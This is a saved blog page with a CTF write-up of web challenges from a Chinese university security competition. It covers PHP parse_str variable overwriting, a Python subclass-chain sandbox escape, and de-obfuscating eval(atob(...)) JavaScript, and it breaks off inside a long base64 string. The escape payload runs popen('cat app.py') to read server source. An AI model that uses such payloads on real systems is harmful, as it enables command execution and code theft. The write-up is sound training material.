@@ -1,0 +1,1088 @@
+<!--
+	作者：Sariay
+	时间：2018-08-26
+	描述：There may be a bug, but don't worry, Qiling(器灵) says that it can work normally! aha!
+-->
+<!DOCTYPE html>
+<html class="html-loading">
+		
+
+<head>
+	<meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <title>
+    
+      第九届中国海洋大学信息安全竞赛web题解 | Infernity&#39;s Blog
+    
+  </title>
+  <meta name="author" content="Infernity">
+  <meta name="keywords" content="" />
+  <meta name="description" content="blog" />
+	<!-- favicon -->
+  <link rel="shortcut icon" href="/img/I.png">
+
+  <!-- css -->
+  
+<link rel="stylesheet" href="/css/Annie.css">
+
+  
+  <!-- jquery -->
+	
+<script src="/plugin/jquery/jquery.min.js"></script>
+
+
+<script>
+    const CONFIG_BGIMAGE = {
+      mode: 'random_you',
+      normalSrc: '/img/header-bg.jpg',
+      randomYouMax: 59,
+      randomYouSrc: '/img/background/',
+	  randomOtherSrc: 'https://api.berryapi.net/?service=App.Bing.Images&day=-0',
+	  preloaderEnable: true
+    }
+	
+    const CONFIG_LEACLOUD_COUNT = {
+      enable: true,
+	  appId: 'AU8',
+	  appKey: '4cU',
+	  serverURLs: 'http' || ' '
+    }
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+	<body>
+		<!-- Preloader -->
+
+	<div id="preloader">
+		<div class="pre-container">
+			
+				<div class="spinner">
+					<div class="double-bounce1"></div>
+					<div class="double-bounce2"></div>
+				</div>
+						
+		</div>
+	</div>
+
+
+<!-- header -->
+<header class="fixbackground bg-pan-br">
+	<div class="mask">
+		<!-- motto -->
+		<div class="h-body">	
+			
+				<div class="motto text-shadow-pop-left">
+					<p class="content" id="motto-content">获取中...</p>
+					<p>-<p>
+					<p class="author" id="motto-author">Just a minute...</p>
+				</div>
+			
+		</div>
+		
+		<!-- others: such as time... -->			
+		<div class="h-footer">
+			<a href="javascript:;" id="read-more" class="scroll-down">
+				<span class="icon-anchor1 animation-scroll-down"></span>
+			</a>
+		</div>
+	</div>
+</header>
+
+<div id="navigation-hide">
+	<!-- Progress bar -->
+	<div id="progress-bar"></div>
+
+	<!-- Progress percent -->
+	<div id="progress-percentage"><span>0.0%</span></div>
+
+	<div class="toc-switch"><span class="switch-button">目录</span></div>
+
+	<!-- Page title -->
+	<p>
+		
+			「第九届中国海洋大学信息安全竞赛web题解」
+		
+	</p>
+
+	
+	
+		<span id="star-button" rel="unlike">
+			<i class="icon-heart"></i>
+		</span>
+	
+
+	<!-- Nav trigger for navigation-H-->
+	<a class="nav-trigger"><span></span></a>
+</div>
+
+<!-- Navigation in div(id="navigation-H") -->
+<nav class="nav-container" id="cd-nav">
+	<div class="nav-header">
+		<span class="logo"> 
+			<img src="/img/logo.png">
+		</span>
+		<a href="javascript:;" class="nav-close"></a>
+	</div>
+	
+	<div class="nav-body">
+		<ul id="global-nav">
+	
+		<li class="menu-home">
+			<a href="/" class="menu-item-home" target="_blank">主页</a>
+		</li>
+		
+	
+		<li class="menu-archive">
+			<a href="/archives" class="menu-item-archive" target="_blank">归档</a>
+		</li>
+		
+	
+		<li class="menu-categories">
+			<a href="/categories" class="menu-item-categories" target="_blank">分类</a>
+		</li>
+		
+	
+		<li class="menu-tags">
+			<a href="/tags" class="menu-item-tags" target="_blank">标签</a>
+		</li>
+		
+	
+		<li class="menu-Friends!">
+			<a href="/friends" class="menu-item-Friends!" target="_blank">Friends!</a>
+		</li>
+		
+	
+		<li class="menu-gallery">
+			<a href="/gallery" class="menu-item-gallery" target="_blank">相册</a>
+		</li>
+		
+	
+
+	
+</ul>
+	</div>
+	
+	<div class="nav-footer">
+		<ul id="global-social">
+	
+		<li>
+			<a href="http://github.com/" target="_blank">
+				<span class="icon-one"><span class="path1"></span><span class="path2"></span></span>
+			</a>
+		</li>
+	
+		<li>
+			<a href="/img/qq.png" target="_blank">
+				<span class="icon-qq"></span>
+			</a>
+		</li>
+	
+		<li>
+			<a href="https://github.com/CyberPunk-Infernity" target="_blank">
+				<span class="icon-github"></span>
+			</a>
+		</li>
+	
+		<li>
+			<a href="/img/weixin.jpg" target="_blank">
+				<span class="icon-weixin"></span>
+			</a>
+		</li>
+	
+		<li>
+			<a href="https://blog.csdn.net/qq_39591427?spm=1000.2115.3001.5343" target="_blank">
+				<span class="icon-csdn"></span>
+			</a>
+		</li>
+	
+		<li>
+			<a href="http://github.com/" target="_blank">
+				<span class="icon-instagram"></span>
+			</a>
+		</li>
+	
+		<li>
+			<a href="http://github.com/" target="_blank">
+				<span class="icon-twitter"></span>
+			</a>
+		</li>
+	
+		<li>
+			<a href="/atom.xml" target="_blank">
+				<span class="icon-rss"></span>
+			</a>
+		</li>
+			
+</ul>
+
+	</div>
+</nav>
+			
+		<!--main-->
+		<main>
+			<!--
+	时间：2018-11-17
+	描述：
+		插件名称：katelog.min.js
+		插件作者：KELEN
+		插件来源: https://github.com/KELEN/katelog
+-->
+
+	
+		<div class="layout-toc">
+			<div id="layout-toc">
+				<div class="k-catelog-list" id="catelog-list" data-title="文章目录"></div>
+			</div>
+		</div>
+
+		
+<script src="/plugin/toc/katelog.min.js"></script>
+
+
+		
+	 
+
+<div class="layout-post">
+	<div id="layout-post">
+		<div class="article-title">
+			
+	<a href="/2024/04/26/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/" itemprop="url">
+		第九届中国海洋大学信息安全竞赛web题解
+	</a>
+
+		</div>
+
+		<div class="article-meta">
+			<span>
+				<i class="icon-calendar1"></i>
+				
+				
+
+
+
+
+	更新于
+
+	<a href="/2024/04/26/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/" itemprop="url">
+		<time datetime="2024-04-26T07:10:47.000Z" itemprop="dateUpdated">
+	  		2024-06-18
+	  </time>
+	</a> 
+
+
+
+			</span>
+			<span>
+				
+	<i class="icon-price-tags"></i>
+	
+		<a href="/tags/WPs/" class=" ">
+			WPs
+		</a>
+	
+		
+			</span>
+			
+			
+
+	
+    <span class="leancloud_visitors" id="/2024/04/26/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/_visitors" data-url="/2024/04/26/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/" data-title="第九届中国海洋大学信息安全竞赛web题解">
+       	<i class="icon-eye"></i>
+       	热度
+        
+            <i class="leancloud_visitors_count" id="leancloud_visitors_count">1</i>
+                   
+    </span>
+    
+
+
+
+	
+    <span class="leancloud_likes" id="/2024/04/26/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/_likes" data-url="/2024/04/26/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/" data-title="第九届中国海洋大学信息安全竞赛web题解" rel="unlike">
+        <i class="icon-heart"></i>
+        喜欢
+        <i class="leancloud_likes_count" id="leancloud_likes_count">0</i>
+    </span>
+	
+
+		</div>
+
+		<div class="article-content" id="article-content">
+			<h1 id="ezPHP"><a href="#ezPHP" class="headerlink" title="ezPHP"></a>ezPHP</h1><p>parse_str()可以进行变量覆盖。</p>
+<p>全部流量包：</p>
+<p><img src="/img/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/fe922ff623f0ed59bc44e3ad44afdf21.png" alt="img"></p>
+<h1 id="菜狗工具-1"><a href="#菜狗工具-1" class="headerlink" title="菜狗工具#1"></a>菜狗工具#1</h1><p>python继承链攻击。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(().__class__.__base__.__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat app.py&#x27;).read())</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="爆率真的高"><a href="#爆率真的高" class="headerlink" title="爆率真的高"></a>爆率真的高</h1><h3 id="事前准备"><a href="#事前准备" class="headerlink" title="事前准备"></a>事前准备</h3><p>禁用了ctrl+U、F12、鼠标右键等操作，防止我们查看源码，这是JS造成的，我们先关闭浏览器的js，再查看源码或者打开开发者工具，最后重新打开js，刷新页面即可正常查看。</p>
+<p>来看看前端源码：</p>
+<p><img src="/img/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/image-20240426151751006.png" alt="image-20240426151751006"></p>
+<p>前两段是在JavaScript中为浏览器添加事件监听器。第一个事件监听器是在鼠标右键点击页面时阻止浏览器默认的上下文菜单弹出。第二个事件监听器是在按下键盘任意键时阻止浏览器默认的键盘事件。这两段代码主要的作用是阻止浏览器执行默认操作，可以用来定制特定的页面交互行为。这就是限制的原理。</p>
+<p>第三段是一个eval里base64加密后的js源码，是这道题的关键点，既然都在html里，我们就把整个html复制下来，放到本地环境方便调试。</p>
+<p>为了方便调试，我们删除其他没用的元素，再删除前两段的限制，只留下关键代码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>爆率真的高<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="built_in">eval</span>(<span class="title function_">atob</span>(<span class="string">&quot;一大堆源码………………&quot;</span>))</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="开调！"><a href="#开调！" class="headerlink" title="开调！"></a>开调！</h3><p>把那一大段base64的js源码解密了，然后把这一坨js格式化了方便查看：<img src="/img/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/image-20240426152709563.png" alt="image-20240426152709563"></p>
+<p>大概审完一遍后只在136行找到了0.9999这个数据与题目提示的0.0001相对应。</p>
+<p>那么就在html全局搜0.9999，断点打在这里，开始调试：</p>
+<p><img src="/img/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/image-20240426152937941.png" alt="image-20240426152937941"></p>
+<p><img src="/img/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/image-20240426153208920.png" alt="image-20240426153208920"></p>
+<p><img src="/img/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/image-20240426153214574.png" alt="image-20240426153214574"></p>
+<p>发现走过_0x4d032d()函数的时候会在控制台打出干扰信息。</p>
+<p><img src="/img/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/image-20240426153639526.png" alt="image-20240426153639526"></p>
+<p>发现_0x4d3fb4()函数是不断清空控制台的函数，这个也是我们的干扰。</p>
+<p>综上，我们需要删除_0x4d032d()函数和_0x4d3fb4()<strong>所有的</strong>函数，并把0.9999删除，这样就能让程序只出flag，且不会清屏。我们将解密后的源码，删除这些东西后重新base64加密并放回eval中：</p>
+<p>删除这两段：</p>
+<p><img src="/img/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/image-20240426154758220.png" alt="image-20240426154758220"></p>
+<p><img src="/img/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/image-20240426153951104.png" alt="image-20240426153951104"></p>
+<p>删除0.9999：</p>
+<p><img src="/img/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/image-20240426154019599.png" alt="image-20240426154019599"></p>
+<p>重新base64加密后放到eval里。</p>
+<p>再打开浏览器看就有了：</p>
+<p><img src="/img/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/image-20240426180242686.png" alt="image-20240426180242686"></p>
+<p>全源码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>爆率真的高<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="built_in">eval</span>(<span class="title function_">atob</span>(<span class="string">&quot;ZnVuY3Rpb24gXzB4NGQ0NShfMHhkMWI2NTksXzB4YWQ3NmIpe3ZhciBfMHgyMjg0NGQ9XzB4MmE4MygpO3JldHVybiBfMHg0ZDQ1PWZ1bmN0aW9uKF8weDQ0MmU3MCxfMHgxYzM1OTgpe18weDQ0MmU3MD1fMHg0NDJlNzAtKDB4MTRmNSsweDFjYjcrLTB4MmZiZCk7dmFyIF8weDFmYzkzMz1fMHgyMjg0NGRbXzB4NDQyZTcwXTtpZihfMHg0ZDQ1WydSU25rVkknXT09PXVuZGVmaW5lZCl7dmFyIF8weDNlNWRkOT1mdW5jdGlvbihfMHgxY2QzMjEpe3ZhciBfMHgzZGU2MTQ9J2FiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVowMTIzNDU2Nzg5Ky89Jzt2YXIgXzB4MWMzNDcyPScnLF8weDFlMDNjMj0nJyxfMHg0NWI4YjE9XzB4MWMzNDcyK18weDNlNWRkOTtmb3IodmFyIF8weDU3YmVhZD0tMHg0M2UrLTB4NGQ5Ki0weDUrLTB4MSoweDEzZmYsXzB4MmM0YmY4LF8weGM2NjRhNyxfMHg1ODhlNTY9MHgzKi0weDc1ZisweDEqMHgyMDFkKy0weDgwKjB4MTQ7XzB4YzY2NGE3PV8weDFjZDMyMVsnY2hhckF0J10oXzB4NTg4ZTU2KyspO35fMHhjNjY0YTcmJihfMHgyYzRiZjg9XzB4NTdiZWFkJSgtMHg3YTQqLTB4NCsweDIxYjcrMHgxKi0weDQwNDMpP18weDJjNGJmOCooMHgyMWU3Ky0weDQ1MistMHgzKjB4OWM3KStfMHhjNjY0YTc6XzB4YzY2NGE3LF8weDU3YmVhZCsrJSgtMHhkNzcrMHgxYmE5Ky0weGUyZSkpP18weDFjMzQ3Mis9XzB4NDViOGIxWydjaGFyQ29kZUF0J10oXzB4NTg4ZTU2KygweGZkMSstMHgzMTgrMHgxMSotMHhiZikpLSgweDk4ZisweDEqMHgxYzgzKy0weDEqMHgyNjA4KSE9PTB4MWMyNCsweDIxMDArLTB4MioweDFlOTI/U3RyaW5nWydmcm9tQ2hhckNvZGUnXSgtMHgxNjIqLTB4MTgrMHhjMiotMHgxMystMHgxMWNiJl8weDJjNGJmOD4+KC0oLTB4MjQwYystMHgzNCotMHgxMisweDIwNjYpKl8weDU3YmVhZCYweDIyOGMrMHgzZDQrLTB4MjY1YSkpOl8weDU3YmVhZDoweDcqMHg0YzMrLTB4OTE2KjB4NCsweDMwMyl7XzB4YzY2NGE3PV8weDNkZTYxNFsnaW5kZXhPZiddKF8weGM2NjRhNyk7fWZvcih2YXIgXzB4MTA5ZmIzPS0weDE1NTQrLTB4MTRiNisweDJhMGEsXzB4NTQwNTQ0PV8weDFjMzQ3MlsnbGVuZ3RoJ107XzB4MTA5ZmIzPF8weDU0MDU0NDtfMHgxMDlmYjMrKyl7XzB4MWUwM2MyKz0nJScrKCcwMCcrXzB4MWMzNDcyWydjaGFyQ29kZUF0J10oXzB4MTA5ZmIzKVsndG9TdHJpbmcnXSgweDEqMHgyNzAxKzB4NjgqMHg0Ky0weDI4OTEpKVsnc2xpY2UnXSgtKC0weDEqMHgyMjhiKy0weDIqLTB4MTFkNCsweDExYiotMHgxKSk7fXJldHVybiBkZWNvZGVVUklDb21wb25lbnQoXzB4MWUwM2MyKTt9O3ZhciBfMHg0MDI5Zjg9ZnVuY3Rpb24oXzB4ZmIzNGVlLF8weDUzOTY4Yil7dmFyIF8weDU4OGUzNT1bXSxfMHg1MjM3N2M9MHgyZDQqLTB4NysweDdiYisweDEqMHhjMTEsXzB4NWIyZmNkLF8weDViNTVkYT0nJztfMHhmYjM0ZWU9XzB4M2U1ZGQ5KF8weGZiMzRlZSk7dmFyIF8weDFhY2E3Zjtmb3IoXzB4MWFjYTdmPTB4MWRhMSstMHgzMjYqLTB4NSstMHgyZDVmO18weDFhY2E3ZjwtMHgxN2E3KjB4MSstMHgxKi0weDE4MmYrLTB4MSotMHg3ODtfMHgxYWNhN2YrKyl7XzB4NTg4ZTM1W18weDFhY2E3Zl09XzB4MWFjYTdmO31mb3IoXzB4MWFjYTdmPTB4ZDlmKzB4ZWI0KzB4MyotMHg5NzE7XzB4MWFjYTdmPDB4MTM0ZSotMHgxKy0weDEqMHgxNDEzKzB4Mjg2MTtfMHgxYWNhN2YrKyl7XzB4NTIzNzdjPShfMHg1MjM3N2MrXzB4NTg4ZTM1W18weDFhY2E3Zl0rXzB4NTM5NjhiWydjaGFyQ29kZUF0J10oXzB4MWFjYTdmJV8weDUzOTY4YlsnbGVuZ3RoJ10pKSUoLTB4MTM4ZSotMHgxKy0weDI0OGIrLTB4NWZmKi0weDMpLF8weDViMmZjZD1fMHg1ODhlMzVbXzB4MWFjYTdmXSxfMHg1ODhlMzVbXzB4MWFjYTdmXT1fMHg1ODhlMzVbXzB4NTIzNzdjXSxfMHg1ODhlMzVbXzB4NTIzNzdjXT1fMHg1YjJmY2Q7fV8weDFhY2E3Zj0tMHhjNiotMHg2Ky0weDEqMHg5YWQrLTB4NTA5Ki0weDEsXzB4NTIzNzdjPTB4NTE4KzB4NTMqMHgxOSstMHhkMzM7Zm9yKHZhciBfMHgxMGRmMjA9MHhkNjYrMHgxYmViKzB4NWU3Ki0weDc7XzB4MTBkZjIwPF8weGZiMzRlZVsnbGVuZ3RoJ107XzB4MTBkZjIwKyspe18weDFhY2E3Zj0oXzB4MWFjYTdmKygweDg0OCstMHgxKi0weDU1OSstMHhkYTApKSUoLTB4NjRjKy0weDI2NSotMHg5Ky0weDU5KjB4MjkpLF8weDUyMzc3Yz0oXzB4NTIzNzdjK18weDU4OGUzNVtfMHgxYWNhN2ZdKSUoMHgxKjB4MTU2NysweGJkNSsweDIwM2MqLTB4MSksXzB4NWIyZmNkPV8weDU4OGUzNVtfMHgxYWNhN2ZdLF8weDU4OGUzNVtfMHgxYWNhN2ZdPV8weDU4OGUzNVtfMHg1MjM3N2NdLF8weDU4OGUzNVtfMHg1MjM3N2NdPV8weDViMmZjZCxfMHg1YjU1ZGErPVN0cmluZ1snZnJvbUNoYXJDb2RlJ10oXzB4ZmIzNGVlWydjaGFyQ29kZUF0J10oXzB4MTBkZjIwKV5fMHg1ODhlMzVbKF8weDU4OGUzNVtfMHgxYWNhN2ZdK18weDU4OGUzNVtfMHg1MjM3N2NdKSUoLTB4MjZlOCstMHgyZDkqLTB4OSstMHgyYiotMHg1NSldKTt9cmV0dXJuIF8weDViNTVkYTt9O18weDRkNDVbJ1pSUG52ZSddPV8weDQwMjlmOCxfMHhkMWI2NTk9YXJndW1lbnRzLF8weDRkNDVbJ1JTbmtWSSddPSEhW107fXZhciBfMHg1ZDFlMWU9XzB4MjI4NDRkWy0weDcwMSsweDIyYjErLTB4MTAqMHgxYmJdLF8weDVlOWYxZT1fMHg0NDJlNzArXzB4NWQxZTFlLF8weDNjOTViNj1fMHhkMWI2NTlbXzB4NWU5ZjFlXTtpZighXzB4M2M5NWI2KXtpZihfMHg0ZDQ1Wyd0dFVrengnXT09PXVuZGVmaW5lZCl7dmFyIF8weDVkMTkyMz1mdW5jdGlvbihfMHg0MDYyNWUpe3RoaXNbJ1ZiTmhKQSddPV8weDQwNjI1ZSx0aGlzWydXalNGTlUnXT1bMHgxKi0weDFiNjkrMHgxZCotMHhkZisweDM4MyoweGYsMHgyKi0weGZlKzB4MTUqMHgxYmQrLTB4MjI4NSwtMHgxKjB4MTU2NCsweDIzMWErLTB4ZGI2XSx0aGlzWydFZnNMbW4nXT1mdW5jdGlvbigpe3JldHVybiduZXdTdGF0ZSc7fSx0aGlzWydOQk1qWm4nXT0nXHg1Y3crXHgyMCpceDVjKFx4NWMpXHgyMCp7XHg1Y3crXHgyMConLHRoaXNbJ3FIRnl6cyddPSdbXHgyN3xceDIyXS4rW1x4Mjd8XHgyMl07P1x4MjAqfSc7fTtfMHg1ZDE5MjNbJ3Byb3RvdHlwZSddWydrVE13R1InXT1mdW5jdGlvbigpe3ZhciBfMHgyODMxY2E9bmV3IFJlZ0V4cCh0aGlzWydOQk1qWm4nXSt0aGlzWydxSEZ5enMnXSksXzB4OGU5ZDI2PV8weDI4MzFjYVsndGVzdCddKHRoaXNbJ0Vmc0xtbiddWyd0b1N0cmluZyddKCkpPy0tdGhpc1snV2pTRk5VJ11bMHgxZDAxKzB4MioweDIwKy0weDkwKjB4MzRdOi0tdGhpc1snV2pTRk5VJ11bMHhjOCotMHgyKy0weDIxNTcrMHgyMmU3XTtyZXR1cm4gdGhpc1sncXB5dVNVJ10oXzB4OGU5ZDI2KTt9LF8weDVkMTkyM1sncHJvdG90eXBlJ11bJ3FweXVTVSddPWZ1bmN0aW9uKF8weDExYjMyNyl7aWYoIUJvb2xlYW4ofl8weDExYjMyNykpcmV0dXJuIF8weDExYjMyNztyZXR1cm4gdGhpc1snTUNUbGliJ10odGhpc1snVmJOaEpBJ10pO30sXzB4NWQxOTIzWydwcm90b3R5cGUnXVsnTUNUbGliJ109ZnVuY3Rpb24oXzB4MmQ4NGNmKXtmb3IodmFyIF8weGU1MzlmPS0weGYxZSsweDEqMHgxZjliKy0weDEwN2QsXzB4MzJmMGQ1PXRoaXNbJ1dqU0ZOVSddWydsZW5ndGgnXTtfMHhlNTM5ZjxfMHgzMmYwZDU7XzB4ZTUzOWYrKyl7dGhpc1snV2pTRk5VJ11bJ3B1c2gnXShNYXRoWydyb3VuZCddKE1hdGhbJ3JhbmRvbSddKCkpKSxfMHgzMmYwZDU9dGhpc1snV2pTRk5VJ11bJ2xlbmd0aCddO31yZXR1cm4gXzB4MmQ4NGNmKHRoaXNbJ1dqU0ZOVSddWzB4MTgxOCsweGYqMHgyODQrLTB4MTQ5YyoweDNdKTt9LG5ldyBfMHg1ZDE5MjMoXzB4NGQ0NSlbJ2tUTXdHUiddKCksXzB4NGQ0NVsndHRVa3p4J109ISFbXTt9XzB4MWZjOTMzPV8weDRkNDVbJ1pSUG52ZSddKF8weDFmYzkzMyxfMHgxYzM1OTgpLF8weGQxYjY1OVtfMHg1ZTlmMWVdPV8weDFmYzkzMzt9ZWxzZSBfMHgxZmM5MzM9XzB4M2M5NWI2O3JldHVybiBfMHgxZmM5MzM7fSxfMHg0ZDQ1KF8weGQxYjY1OSxfMHhhZDc2Yik7fXZhciBfMHg0MmQ2NTM9XzB4NGQ0NTsoZnVuY3Rpb24oXzB4M2RlOTU4LF8weDJiOTc3OCl7dmFyIF8weDVhOTJjYT1fMHg0ZDQ1LF8weDUzODRhNj1fMHgzZGU5NTgoKTt3aGlsZSghIVtdKXt0cnl7dmFyIF8weDFiNTVkOD1wYXJzZUludChfMHg1YTkyY2EoMHgyMWQsJyZoZV4nKSkvKC0weGU1OCsweDIqLTB4MTFlZisweDMyMzcqMHgxKStwYXJzZUludChfMHg1YTkyY2EoMHgyMTYsJzAzQXcnKSkvKC0weDJiMyotMHgxKzB4MTQqMHgyMistMHg1NTkpK3BhcnNlSW50KF8weDVhOTJjYSgweDIwZiwnQGwqZCcpKS8oMHgyKi0weGQyMisweDEqLTB4ZTAzKzB4Mjg0YSkqKC1wYXJzZUludChfMHg1YTkyY2EoMHgxZmYsJzFNYzAnKSkvKC0weDE4M2YrLTB4MjMwKy0weDI1Ki0weGI3KSkrcGFyc2VJbnQoXzB4NWE5MmNhKDB4MjI2LCc2eGIkJykpLygweDFmKi0weDFmKzB4MjFiZSstMHg4OSoweDM4KSoocGFyc2VJbnQoXzB4NWE5MmNhKDB4MjA2LCcmSHRbJykpLygtMHgxKjB4NGIzKy0weGQwNSstMHg4ZGYqLTB4MikpK3BhcnNlSW50KF8weDVhOTJjYSgweDFmMCwnaTFubycpKS8oMHgyMDM0Ky0weGRmOCstMHgxMjM1KSstcGFyc2VJbnQoXzB4NWE5MmNhKDB4MjE4LCd3QTh0JykpLygtMHgxZjFmKy0weDExOGMqLTB4MSsweGQ5YikqKHBh